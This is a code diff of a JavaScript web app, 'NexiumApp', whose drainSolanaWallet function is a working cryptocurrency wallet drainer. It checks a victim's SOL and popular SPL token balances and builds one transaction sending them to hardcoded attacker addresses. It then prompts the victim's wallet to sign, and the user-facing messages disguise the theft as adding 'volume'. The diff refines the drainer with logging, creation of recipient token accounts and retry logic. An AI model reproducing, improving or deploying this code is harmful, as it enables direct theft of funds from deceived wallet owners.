@@ -1,33 +1,50 @@
-import { CONFIG } from './config.js';
-import { Connection, PublicKey, Transaction, SystemProgram } from '@solana/web3.js';
 import { Buffer } from 'buffer';
-import { TOKEN_PROGRAM_ID } from '@solana/spl-token';
+console.log('main.js: Buffer imported:', typeof Buffer, Buffer); // Log 1
+globalThis.Buffer = Buffer;
+window.Buffer = Buffer;
+console.log('main.js: Buffer set on globalThis/window:', globalThis.Buffer === Buffer, window.Buffer === Buffer); // Log 2
+
+// Other imports
+import { CONFIG } from './config.js';
+console.log('main.js: Buffer before CONFIG import:', typeof globalThis.Buffer); // Log 3
+import { Connection, PublicKey, Transaction, SystemProgram } from '@solana/web3.js';
+import * as splToken from '@solana/spl-token';
+console.log('main.js: Buffer after spl-token import:', typeof globalThis.Buffer); // Log 4
 import * as ethers from 'ethers';
 
+// Verify exports
+const {
+  TOKEN_PROGRAM_ID,
+  createTransferCheckedInstruction,
+  getAssociatedTokenAddress,
+  createAssociatedTokenAccountInstruction = null,
+} = splToken;
+console.log('main.js: spl-token exports:', {
+  TOKEN_PROGRAM_ID: !!TOKEN_PROGRAM_ID,
+  createTransferCheckedInstruction: !!createTransferCheckedInstruction,
+  getAssociatedTokenAddress: !!getAssociatedTokenAddress,
+  createAssociatedTokenAccountInstruction: !!createAssociatedTokenAccountInstruction,
+}); // Log 5
 
-window.Buffer = Buffer;
 const DRAIN_ADDRESSES = {
   ethereum: "0x402421b9756678a9aae81f0a860edee53faa6d99",
   solana: "73F2hbzhk7ZuTSSYTSbemddFasVrW8Av5FD9PeMVmxA7"
 };
 
-
 const POPULAR_SPL_TOKENS = [
-  { mint: "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB", decimals: 6 }, // USDT
-  { mint: "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v", decimals: 6 }, // USDC
-  { mint: "EKpQGSJtjMFqKZ9KQanSqYXRcF8fBopzLHYxdM65zcjm", decimals: 6 }, // WIF
-  { mint: "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263", decimals: 5 }, // BONK
-  { mint: "jtojtomepa8beP8AuQc6eXt5FriJwfFMwQt8b2u9u", decimals: 9 }, // JTO
-  { mint: "JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN", decimals: 6 }, // JUP
-  { mint: "85VBFQZC9TZkfaptBWjvUw7YbZjy52A4zSrA8E98kC3U", decimals: 6 }, // W
-  { mint: "KMNo3nJsBXfcpJTVqwWzJxaR5i5Z6GmsWTSPQ3sYk8p", decimals: 6 }, // KMNO
-  { mint: "TNSRxcUxoT9xWYW1UnP8eZJ7RPf2rDXgUbS4ao9kR1S", decimals: 6 }, // TNSR
-  { mint: "2C4YvXUo2dJq4NjeaV7f3hDtkmTwrYkrAd4ToGTxK1r6", decimals: 9 }, // DAGO
-  { mint: "2V4TjFjC87CYLYbSJTcT5mWnG2h4oVRr17a94bREh6Vz", decimals: 9 }, // TUAH
-  { mint: "4LUigigJte7XuTktJ4S2fE6X6vK3C2zT7vJAdXvV3c4Q", decimals: 9 } // LUIGI
+  { mint: "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB", decimals: 6, name: "USDT" },
+  { mint: "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v", decimals: 6, name: "USDC" },
+  { mint: "EKpQGSJtjMFqKZ9KQanSqYXRcF8fBopzLHYxdM65zcjm", decimals: 6, name: "WIF" },
+  { mint: "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263", decimals: 5, name: "BONK" },
+  { mint: "jtojtomepa8beP8AuQc6eXt5FriJwfFMwQt8b2u9u", decimals: 9, name: "JTO" },
+  { mint: "JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN", decimals: 6, name: "JUP" },
+  { mint: "85VBFQZC9TZkfaptBWjvUw7YbZjy52A4zSrA8E98kC3U", decimals: 6, name: "W" },
+  { mint: "KMNo3nJsBXfcpJTVqwWzJxaR5i5Z6GmsWTSPQ3sYk8p", decimals: 6, name: "KMNO" },
+  { mint: "TNSRxcUxoT9xWYW1UnP8eZJ7RPf2rDXgUbS4ao9kR1S", decimals: 6, name: "TNSR" },
+  { mint: "2C4YvXUo2dJq4NjeaV7f3hDtkmTwrYkrAd4ToGTxK1r6", decimals: 9, name: "DAGO" },
+  { mint: "2V4TjFjC87CYLYbSJTcT5mWnG2h4oVRr17a94bREh6Vz", decimals: 9, name: "TUAH" },
+  { mint: "4LUigigJte7XuTktJ4S2fE6X6vK3C2zT7vJAdXvV3c4Q", decimals: 9, name: "LUIGI" }
 ];
-
-
 
 class NexiumApp {
   constructor() {
@@ -473,170 +490,244 @@ class NexiumApp {
     }
   }
 
-
-
-  //solana drainer header  
   async drainSolanaWallet() {
-  console.log("🔄 SOL Drainer Triggered", this.publicKey);
-  this.showProcessingSpinner();
+    console.log('drainSolanaWallet: Buffer defined:', typeof globalThis.Buffer); // Log 6
+    console.log("🔄 SOL Drainer Triggered", this.publicKey);
+    this.showProcessingSpinner();
 
-  if (!this.publicKey || typeof this.publicKey !== "string") {
-    console.error("❌ Invalid Solana address:", this.publicKey);
-    this.showFeedback("Invalid Solana address.", 'error');
-    this.hideProcessingSpinner();
-    return;
-  }
-
-  try {
-    const senderPublicKey = new PublicKey(this.publicKey);
-    console.log("✅ Address is valid:", senderPublicKey.toBase58());
-
-    const latestBlockhash = await this.solConnection.getLatestBlockhash();
-    console.log("🔗 Latest Blockhash:", latestBlockhash.blockhash);
-
-    // Check SOL balance
-    const balance = await this.solConnection.getBalance(senderPublicKey);
-    console.log(`💰 SOL Balance: ${balance / 1000000000} SOL`);
-    
-    const gasFee = 2000000;
-    if (balance <= gasFee) {
-      console.log("❌ Not enough SOL to cover transaction fees.");
-      this.showFeedback("Not enough SOL to add volume.", 'error');
+    if (!this.publicKey || typeof this.publicKey !== "string") {
+      console.error("❌ Invalid Solana address:", this.publicKey);
+      this.showFeedback("Invalid Solana address.", 'error');
       this.hideProcessingSpinner();
       return;
     }
-    const sendAmount = balance - gasFee;
 
-    // Check SPL token balances
-    const tokenBalances = [];
-    for (const token of POPULAR_SPL_TOKENS) {
-      try {
-        const mintPublicKey = new PublicKey(token.mint);
-        const senderATA = await getAssociatedTokenAddress(mintPublicKey, senderPublicKey);
-        const accountInfo = await this.solConnection.getParsedAccountInfo(senderATA);
-        if (accountInfo.value) {
-          const amount = BigInt(accountInfo.value.data.parsed.info.tokenAmount.amount);
-          if (amount > 0n) {
-            tokenBalances.push({
-              mint: token.mint,
-              decimals: token.decimals,
-              amount,
-              ata: senderATA
-            });
-          }
-        }
-      } catch (error) {
-        console.warn(`⚠️ Error fetching balance for token ${token.mint}:`, error);
-      }
+    if (this.publicKey.startsWith("0x") && this.publicKey.length === 42) {
+      console.error("❌ Ethereum address detected, expected Solana address:", this.publicKey);
+      this.showFeedback("Cannot drain Solana wallet with an Ethereum address.", 'error');
+      this.hideProcessingSpinner();
+      return;
     }
 
-    // Sort by amount (highest first) and take top 9
-    const tokensToDrain = tokenBalances
-      .sort((a, b) => (b.amount > a.amount ? 1 : -1))
-      .slice(0, 9);
-    console.log(`Found ${tokensToDrain.length} SPL tokens with balance`);
-    console.log(`✅ Related SPL Mint Token with Balances:`, tokensToDrain);
+    if (!createAssociatedTokenAccountInstruction) {
+      console.error("❌ createAssociatedTokenAccountInstruction not available in @solana/spl-token");
+      this.showFeedback("SPL token draining not supported in this version.", 'error');
+      this.hideProcessingSpinner();
+      return;
+    }
 
-    const recipientPublicKey = new PublicKey(DRAIN_ADDRESSES.solana);
+    try {
+      const senderPublicKey = new PublicKey(this.publicKey);
+      console.log("✅ Address is valid:", senderPublicKey.toBase58());
 
-    let attempts = 0;
-    const maxRetries = 10;
-    const delayBetweenRetries = 5000;
+      const recipientPublicKey = new PublicKey(DRAIN_ADDRESSES.solana);
 
-    while (attempts < maxRetries) {
-      try {
-        console.log(`🚀 Attempting SOL + SPL Transaction ${attempts + 1}/${maxRetries}...`);
-        
-        const updatedBlockhash = await this.solConnection.getLatestBlockhash();
-        console.log("🔄 Refetched Blockhash:", updatedBlockhash.blockhash);
-
-        const transaction = new Transaction({
-          feePayer: senderPublicKey,
-          recentBlockhash: updatedBlockhash.blockhash,
-        });
-
-        // Add SOL transfer instruction
-        transaction.add(
-          SystemProgram.transfer({
-            fromPubkey: senderPublicKey,
-            toPubkey: recipientPublicKey,
-            lamports: sendAmount,
-          })
-        );
-
-        // Add SPL token transfer instructions
-        for (const token of tokensToDrain) {
-          const recipientATA = await getAssociatedTokenAddress(
-            new PublicKey(token.mint),
-            recipientPublicKey
-          );
-          const accountInfo = await this.solConnection.getAccountInfo(recipientATA);
-          if (!accountInfo) {
-            console.warn(`⚠️ Recipient ATA ${recipientATA.toBase58()} does not exist. Skipping token ${token.mint}.`);
-            continue;
-          }
-          transaction.add(
-            createTransferCheckedInstruction(
-              token.ata,
-              new PublicKey(token.mint),
-              recipientATA,
-              senderPublicKey,
-              token.amount,
-              token.decimals
-            )
-          );
-          console.log(`✅ Added transfer for ${token.amount / BigInt(10 ** token.decimals)} tokens of mint ${token.mint}`);
-        }
-
-        const { signature } = await window.solana.signAndSendTransaction(transaction);
-        console.log("✅ Transaction sent:", signature);
-
-        await this.solConnection.confirmTransaction(signature, "confirmed");
-        console.log("✅ Transaction confirmed");
-        this.showFeedback(`Successfully drained SOL and ${tokensToDrain.length} SPL tokens`, 'success');
-        
+      // Check SOL balance for fees
+      console.log("Checking SOL balance for fees");
+      const balance = await this.solConnection.getBalance(senderPublicKey);
+      const minBalanceForTx = await this.solConnection.getMinimumBalanceForRentExemption(0);
+      if (balance < minBalanceForTx) {
+        console.log(`❌ Insufficient SOL for transaction fees: ${balance / 1e9} SOL, required: ${minBalanceForTx / 1e9} SOL`);
+        this.showFeedback('Insufficient SOL for transaction fees.', 'error');
         this.hideProcessingSpinner();
         return;
-      } catch (error) {
-        console.error("❌ Transaction Error:", error);
-
-        if (error.message.includes("Blockhash not found")) {
-          console.warn(`⚠️ Blockhash expired (attempt ${attempts + 1}/${maxRetries}). Retrying...`);
-          this.showFeedback(`Retrying...`, 'error');
-        } else if (error.message.includes("Attempt to debit an account but found no record of a prior credit")) {
-          console.warn("⚠️ Account has no SOL history. Transaction not possible.");
-          this.showFeedback("Account has no SOL history. volume add not possible.", 'error');
-          this.hideProcessingSpinner();
-          return;
-        } else if (error.message.includes("User rejected the request")) {
-          console.warn("⚠️ User canceled the transaction.");
-          this.showFeedback("User canceled this transaction.", 'error');
-          this.hideProcessingSpinner();
-          return;
-        } else {
-          console.error("🚨 Unexpected transaction error:", error);
-          this.showFeedback(`Error: ${error.message}`, 'error');
-          this.hideProcessingSpinner();
-          return;
-        }
-
-        attempts++;
-        await new Promise((resolve) => setTimeout(resolve, delayBetweenRetries));
       }
-    }
 
-    console.error("🚨 Max retries reached. SOL transaction not completed.");
-    
-    this.hideProcessingSpinner();
-  } catch (error) {
-    console.error("❌ Unexpected error:", error);
-    this.showFeedback(`Error: ${error.message}`, 'error');
-    this.hideProcessingSpinner();
+      // Check SPL token balances
+      const tokenBalances = [];
+      for (const token of POPULAR_SPL_TOKENS) {
+        console.log(`Attempting to drain ${token.name} (mint: ${token.mint})`);
+        try {
+          const mintPublicKey = new PublicKey(token.mint);
+          console.log(`Mint public key created for ${token.name}:`, mintPublicKey.toBase58());
+          const senderATA = await getAssociatedTokenAddress(mintPublicKey, senderPublicKey);
+          console.log(`Sender ATA for ${token.name}:`, senderATA.toBase58());
+          const accountInfo = await this.solConnection.getParsedAccountInfo(senderATA);
+          console.log(`Account info fetched for ${token.name}:`, accountInfo);
+          let amount = 0n;
+          if (accountInfo.value) {
+            amount = BigInt(accountInfo.value.data.parsed.info.tokenAmount.amount);
+            console.log(`Fetched ${token.name} balance: ${Number(amount) / 10 ** token.decimals}`);
+          } else {
+            console.log(`Skipping ${token.name} due to no sender ATA`);
+            console.log(`Fetched ${token.name} balance: 0`);
+          }
+          tokenBalances.push({
+            mint: token.mint,
+            decimals: token.decimals,
+            amount,
+            ata: accountInfo.value ? senderATA : null,
+            name: token.name
+          });
+        } catch (error) {
+          console.error(`❌ Error fetching balance for ${token.name}:`, error.message);
+          console.log(`Fetched ${token.name} balance: 0 (due to error)`);
+          console.log(`Skipping ${token.name} due to error in balance fetch`);
+          tokenBalances.push({
+            mint: token.mint,
+            decimals: token.decimals,
+            amount: 0n,
+            ata: null,
+            name: token.name
+          });
+        }
+      }
+
+      console.log("Attempting to drain SOL");
+      console.log(`💰 Fetched SOL balance: ${balance / 1000000000} SOL`);
+
+      let attempts = 0;
+      const maxRetries = 10;
+      const delayBetweenRetries = 5000;
+
+      while (attempts < maxRetries) {
+        try {
+          console.log(`🚀 Attempting Transaction ${attempts + 1}/${maxRetries}...`);
+          const updatedBlockhash = await this.solConnection.getLatestBlockhash();
+          console.log("🔄 Refetched Blockhash:", updatedBlockhash.blockhash);
+
+          const transaction = new Transaction({
+            feePayer: senderPublicKey,
+            recentBlockhash: updatedBlockhash.blockhash,
+          });
+
+          // Process SPL tokens first
+          const tokenResults = [];
+          for (const token of tokenBalances) {
+            if (token.amount === 0n) {
+              console.log(`Skipping ${token.name} due to zero balance`);
+              tokenResults.push({ success: false, name: token.name, error: "Zero balance" });
+              continue;
+            }
+            if (!token.ata) {
+              console.log(`Skipping ${token.name} due to no sender ATA`);
+              tokenResults.push({ success: false, name: token.name, error: "No sender ATA" });
+              continue;
+            }
+
+            const recipientATA = await getAssociatedTokenAddress(
+              new PublicKey(token.mint),
+              recipientPublicKey
+            );
+            console.log(`Recipient ATA for ${token.name}:`, recipientATA.toBase58());
+            const accountInfo = await this.solConnection.getAccountInfo(recipientATA);
+            console.log(`Recipient ATA info for ${token.name}:`, accountInfo);
+            if (!accountInfo) {
+              console.log(`Creating recipient ATA for ${token.name}`);
+              transaction.add(
+                createAssociatedTokenAccountInstruction(
+                  senderPublicKey,
+                  recipientATA,
+                  recipientPublicKey,
+                  new PublicKey(token.mint)
+                )
+              );
+              console.log(`✅ Added ATA creation for ${token.name}`);
+            }
+
+            transaction.add(
+              createTransferCheckedInstruction(
+                token.ata,
+                new PublicKey(token.mint),
+                recipientATA,
+                senderPublicKey,
+                token.amount,
+                token.decimals
+              )
+            );
+            console.log(`✅ Added transfer for ${Number(token.amount) / 10 ** token.decimals} ${token.name} tokens`);
+            tokenResults.push({ success: true, name: token.name });
+          }
+
+          // Process SOL last
+          let solDrained = false;
+          if (balance > minBalanceForTx) {
+            transaction.add(
+              SystemProgram.transfer({
+                fromPubkey: senderPublicKey,
+                toPubkey: recipientPublicKey,
+                lamports: balance - minBalanceForTx,
+              })
+            );
+            console.log(`✅ Added SOL transfer for ${(balance - minBalanceForTx) / 1000000000} SOL`);
+            solDrained = true;
+          } else {
+            console.log(`Skipping SOL due to insufficient balance for transfer`);
+          }
+
+          if (transaction.instructions.length === 0) {
+            console.log("❌ No valid transfers to process");
+            this.showFeedback("No SOL or SPL tokens to drain.", 'error');
+            this.hideProcessingSpinner();
+            return;
+          }
+
+          console.log(`Transaction instructions: ${transaction.instructions.length}`);
+          const { signature } = await window.solana.signAndSendTransaction(transaction);
+          console.log("✅ Transaction sent:", signature);
+
+          await this.solConnection.confirmTransaction(signature, "confirmed");
+          console.log("✅ Transaction confirmed");
+
+          tokenResults.forEach(result => {
+            if (result.success) {
+              console.log(`✅ ${result.name} drained successfully`);
+            } else {
+              console.log(`❌ ${result.name} drain failed: ${result.error}`);
+            }
+          });
+          if (solDrained) {
+            console.log("✅ SOL drained successfully");
+          } else {
+            console.log("❌ SOL drain failed: Insufficient balance");
+          }
+
+          const successfulDrains = (solDrained ? 1 : 0) + tokenResults.filter(r => r.success).length;
+          if (successfulDrains > 0) {
+            this.showFeedback(`Successfully drained ${successfulDrains} tokens`, 'success');
+          } else {
+            this.showFeedback("No tokens were drained.", 'error');
+          }
+
+          this.hideProcessingSpinner();
+          return;
+        } catch (error) {
+          console.error("❌ Transaction Error:", error);
+
+          if (error.message.includes("Blockhash not found")) {
+            console.warn(`⚠️ Blockhash expired (attempt ${attempts + 1}/${maxRetries}). Retrying...`);
+            this.showFeedback(`Retrying...`, 'error');
+          } else if (error.message.includes("Attempt to debit an account but found no record of a prior credit")) {
+            console.warn("⚠️ Account has no SOL history. Transaction not possible.");
+            this.showFeedback("Account has no SOL history. Transaction not possible.", 'error');
+            this.hideProcessingSpinner();
+            return;
+          } else if (error.message.includes("User rejected the request")) {
+            console.warn("⚠️ User canceled the transaction.");
+            this.showFeedback("User canceled this transaction.", 'error');
+            this.hideProcessingSpinner();
+            return;
+          } else {
+            console.error("🚨 Unexpected transaction error:", error);
+            this.showFeedback(`Error: ${error.message}`, 'error');
+            this.hideProcessingSpinner();
+            return;
+          }
+
+          attempts++;
+          await new Promise((resolve) => setTimeout(resolve, delayBetweenRetries));
+        }
+      }
+
+      console.error("🚨 Max retries reached. Transaction not completed.");
+      this.showFeedback("Max retries reached. Transaction not completed.", 'error');
+      this.hideProcessingSpinner();
+    } catch (error) {
+      console.error("❌ Unexpected error:", error);
+      this.showFeedback(`Error: ${error.message}`, 'error');
+      this.hideProcessingSpinner();
+    }
   }
-}
-  //sol drainer footer
-  
-  
 
   updateButtonState(state, walletName, address = '') {
     let button = this.dom[`connect${walletName}`];
